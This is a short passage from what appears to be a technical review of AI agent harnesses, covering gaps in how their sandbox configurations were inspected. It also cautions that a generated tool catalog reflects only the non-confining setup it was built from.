  'provider-managed'` exists as a literal; and the `packages/e2b` group was not opened - it is a
  remote-executor seam that could replace the shell entirely.
- **pi**: `@anthropic-ai/sandbox-runtime`'s internals are not vendored, so what its profile actually
  permits is outside what can be cited from pi.

One note on reading a generated document: dsh's `docs/tool-catalog.md` is produced by booting each
plugin and reading `ctx.tools.schemas()`, which makes it unusually trustworthy - but it boots with a
*non-confining* fs backend, so it shows `write`/`edit` without the
`sandbox_permissions`/`justification` parameters the shipped bundle actually adds. A generated
catalog is still a catalog of one configuration.
